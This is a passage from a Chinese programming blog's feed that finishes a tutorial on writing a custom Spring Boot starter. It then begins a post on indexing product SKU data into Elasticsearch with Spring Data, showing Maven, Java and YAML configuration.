http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!--引入spring-boot-starter；所有starter的基本配置--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"atguigu.hello"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String prefix;</span><br><span class="line">    <span class="keyword">private</span> String suffix;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPrefix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrefix</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prefix = prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSuffix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> suffix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSuffix</span><span class="params">(String suffix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.suffix = suffix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloProperties <span class="title">getHelloProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHelloProperties</span><span class="params">(HelloProperties helloProperties)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.helloProperties = helloProperties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHellAtguigu</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloProperties.getPrefix()+<span class="string">"-"</span> +name + helloProperties.getSuffix();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//web应用才生效</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span>(HelloProperties.class)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceAutoConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloService <span class="title">helloService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        HelloService service = <span class="keyword">new</span> HelloService();</span><br><span class="line">        service.setHelloProperties(helloProperties);</span><br><span class="line">        <span class="keyword">return</span> service;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="更多SpringBoot整合示例"><a href="#更多SpringBoot整合示例" class="headerlink" title="更多SpringBoot整合示例"></a>更多SpringBoot整合示例</h1><p><a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Spring-Boot如何学习？&quot;&gt;&lt;a href=&quot;#Spring-Boot如何学习？&quot; class=&quot;headerlink&quot; title=&quot;Spring Boot如何学习？&quot;&gt;&lt;/a&gt;Spring Boot如何学习？&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2551084964,3275034231&amp;fm=26&amp;gp=0.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;1、Spring-Boot-简介&quot;&gt;&lt;a href=&quot;#1、Spring-Boot-简介&quot; class=&quot;headerlink&quot; title=&quot;1、Spring Boot 简介&quot;&gt;&lt;/a&gt;1、Spring Boot 简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;简化Spring应用开发的一个框架；&lt;/p&gt;
&lt;p&gt;整个Spring技术栈的一个大整合；&lt;/p&gt;
&lt;p&gt;J2EE开发的一站式解决方案；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2、微服务&quot;&gt;&lt;a href=&quot;#2、微服务&quot; class=&quot;headerlink&quot; title=&quot;2、微服务&quot;&gt;&lt;/a&gt;2、微服务&lt;/h2&gt;&lt;p&gt;2014，martin fowler&lt;/p&gt;
&lt;p&gt;微服务：架构风格（服务微化）&lt;/p&gt;
&lt;p&gt;一个应用应该是一组小型服务；可以通过HTTP的方式进行互通；&lt;/p&gt;
&lt;p&gt;单体应用：ALL IN ONE&lt;/p&gt;
&lt;p&gt;微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元；&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;详细参照微服务文档&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="https://muzimz.cn/categories/Java/"/>
    
    
      <category term="Java" scheme="https://muzimz.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>基于SpringData Es对Elasticsearch进行操作</title>
    <link href="https://muzimz.cn/2019/08/03/%E5%9F%BA%E4%BA%8ESpringData%20Es%E5%AF%B9Elasticsearch%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/"/>
    <id>https://muzimz.cn/2019/08/03/基于SpringData Es对Elasticsearch进行操作/</id>
    <published>2019-08-03T01:31:23.000Z</published>
    <updated>2020-02-21T02:41:43.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于SpringData-Es对Elasticsearch进行操作"><a href="#基于SpringData-Es对Elasticsearch进行操作" class="headerlink" title="基于SpringData Es对Elasticsearch进行操作"></a>基于SpringData Es对Elasticsearch进行操作</h1><h2 id="基本环境的搭建"><a href="#基本环境的搭建" class="headerlink" title="基本环境的搭建"></a>基本环境的搭建</h2><ul><li>首先需要搭建Elasticsearch集群（参考如上，es1 es2 es3）<blockquote><p>注意：这里在docker中创建elasticsearch容器的过程中，需要指定一定大小的<code>ES_JAVA_OPTS=&quot;-Xms256m -Xmx256m&quot;</code>值，否则后面在执行导入mysql数据表中数据到es索引库中会产生问题，建议设置为<code>750m</code>，将数据导入到索引库之后即可重新创建es1，将值设定为<code>256m</code>即可</p></blockquote></li><li>创建changgou-service-search-api<br>在pom.xml文件引入相关的依赖</li></ul><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1062140215,59502734&fm=26&gp=0.jpg"></p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--goods API依赖，等会要调用goods服务中的SkuFeign来查询所有的sku。api中除了写pojo外，还要写feign--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.muzimz.changgou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>changgou-service-goods-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--SpringDataES依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>创建changgou-service-search工程，并进行如下操作</li></ul><p>在pom.xml中引入相关的依赖<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.muzimz.changgou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>changgou-service-search-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在com.changgou中创建SearchApplication.java启动类<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.changgou;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.netflix.eureka.EnableEurekaClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.elasticsearch.repository.config.EnableElasticsearchRepositories;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication(exclude=&#123;DataSourceAutoConfiguration.class&#125;)</span> <span class="comment">//禁用数据库的加载</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = <span class="meta-string">"com.changgou.goods.feign"</span>)</span>  <span class="comment">//开启Feign的调用</span></span><br><span class="line"><span class="meta">@EnableElasticsearchRepositories(basePackages = <span class="meta-string">"com.changgou.search.dao"</span>)</span>  <span class="comment">// 开启elasticsearch的包扫描</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> static void main(String[] args) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Springboot整合Elasticsearch 在项目启动前设置一下的属性，防止报错</span></span><br><span class="line"><span class="comment">         * 解决netty冲突后初始化client时还会抛出异常</span></span><br><span class="line"><span class="comment">         * availableProcessors is already set to [12], rejecting [12]</span></span><br><span class="line"><span class="comment">         ***/</span></span><br><span class="line">        System.setProperty(<span class="string">"es.set.netty.runtime.available.processors"</span>, <span class="string">"false"</span>);</span><br><span class="line">        SpringApplication.run(SearchApplication.<span class="keyword">class</span>,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建application.yml文件，并进行如下配置<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">19085</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  application:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">search</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">  data:</span></span><br><span class="line"><span class="attr">    elasticsearch:</span></span><br><span class="line"><span class="attr">      cluster-name:</span> <span class="string">elasticsearch</span> <span class="comment"># es集群的名字，在elasticsearch.yml中有定义</span></span><br><span class="line"><span class="attr">      cluster-nodes:</span> <span class="number">192.168</span><span class="number">.220</span><span class="number">.201</span><span class="string">:9300</span> <span class="comment"># 注意这里是9300端口，而不是9200,9300指的是elasticsearch的Tcp通信端口，而9200是http请求端口，通过docker ps可看出9300tcp端口</span></span><br><span class="line"><span class="attr">      repositories:</span></span><br><span class="line"><span class="attr">        enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  main:</span></span><br><span class="line"><span class="attr">    allow-bean-definition-overriding:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line"><span class="attr">  client:</span></span><br><span class="line"><span class="attr">    service-url:</span></span><br><span class="line"><span class="attr">      defaultZone:</span> <span class="attr">http://127.0.0.1:6868/eureka</span></span><br><span class="line"><span class="attr">  instance:</span></span><br><span class="line"><span class="attr">    prefer-ip-address:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line"><span class="attr">  hystrix:</span></span><br><span class="line"><span class="attr">    enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#超时配置</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line"><span class="attr">  ReadTimeout:</span> <span class="number">3000000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">hystrix:</span></span><br><span class="line"><span class="attr">  command:</span></span><br><span class="line"><span class="attr">    default:</span></span><br><span class="line"><span class="attr">      execution:</span></span><br><span class="line"><span class="attr">        timeout:</span></span><br><span class="line">          <span class="comment">#如果enabled设置为false，则请求超时交给ribbon控制</span></span><br><span class="line"><span class="attr">          enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">        isolation:</span></span><br><span class="line"><span class="attr">          thread:</span></span><br><span class="line"><span class="attr">            timeoutInMilliseconds:</span> <span class="number">100000000</span></span><br><span class="line"><span class="attr">          strategy:</span> <span class="string">SEMAPHORE</span></span><br></pre></td></tr></table></figure></p><h2 id="将数据导入索引库"><a href="#将数据导入索引库" class="headerlink" title="将数据导入索引库"></a>将数据导入索引库</h2><p>数据导入流程：<br>1、请求serch服务，调用数据导入地址<br>2、根据注册中心中的注册的goods服务的地址，使用Feign方式查询所有已经审核的sku<br>3、使用SpringData es将查询到的sku集合导入到es中</p><p>实现过程：<br>1、创建一个javabean（skuinfo）中添加索引库映射配置<br>2、创建Feign，实现查询所有sku集合<br>3、在搜索微服务中调用Feign，查询所有sku集合，并且将sku集合转化成skuinfo集合<br>4、Controller-》service-》dao（继承ElasticsearchRepository）实现数据导入到es中</p><ul><li>在changgou-service-search-api中的com.changgou.search.pojo中创建SkuInfo.java实体类，用于对es数据的封装</li></ul><p>在这个类中需要指定导入索引库的名称和类型，以及各个字段的数据类型（text、double等），以及是否需要支持ik分词等<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">package com.changgou.search.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="built_in">data</span>.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="built_in">data</span>.elasticsearch.annotations.Document;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="built_in">data</span>.elasticsearch.annotations.Field;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="built_in">data</span>.elasticsearch.annotations.FieldType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Date</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Document(indexName = <span class="string">"skuinfo"</span>,<span class="keyword">type</span> = <span class="string">"docs"</span>)  <span class="comment">// 用于指定索引名称和类型名称</span></span><br><span class="line"><span class="keyword">public</span> class SkuInfo implements Serializable &#123;</span><br><span class="line">    <span class="comment">//商品id，同时也是商品编号</span></span><br><span class="line">    @Id</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * SKU名称</span></span><br><span class="line"><span class="comment">     * type = FieldType.Text:类型，Text支持分词</span></span><br><span class="line"><span class="comment">     * index = true:添加数据的时候，是否分词</span></span><br><span class="line"><span class="comment">     * analyzer = "ik_smart":创建索引的分词器</span></span><br><span class="line"><span class="comment">     * store = false:是否存储</span></span><br><span class="line"><span class="comment">     * searchAnalyzer = "ik_smart":搜索时候使用的分词器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Field(<span class="keyword">type</span> = FieldType.Text, analyzer = <span class="string">"ik_smart"</span>,index = <span class="literal">true</span>,store = <span class="literal">false</span>,searchAnalyzer = <span class="string">"ik_smart"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//商品价格，单位为：元</span></span><br><span class="line">    @Field(<span class="keyword">type</span> = FieldType.Double)</span><br><span class="line">    <span class="keyword">private</span> Long price;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//库存数量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">Integer</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//商品图片</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> image;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//商品状态，1-正常，2-下架，3-删除</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">Date</span> createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//更新时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">Date</span> updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否默认</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> isDefault;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SPUID</span></span><br><span class="line">    <span class="keyword">private</span> Long spuId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//类目ID</span></span><br><span class="line">    <span class="keyword">private</span> Long categoryId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/****</span></span><br><span class="line"><span class="comment">     * 类目名称</span></span><br><span class="line"><span class="comment">     * type = FieldType.Keyword:不分词</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Field(<span class="keyword">type</span> = FieldType.<span class="built_in">Keyword</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> categoryName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * 品牌名称</span></span><br><span class="line"><span class="comment">     * type = FieldType.Keyword:不分词</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Field(<span class="keyword">type</span> = FieldType.<span class="built_in">Keyword</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> brandName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//规格</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">String</span> spec;   <span class="comment">//Map(String)-&gt;Map类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//规格参数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">Map</span>&lt;<span 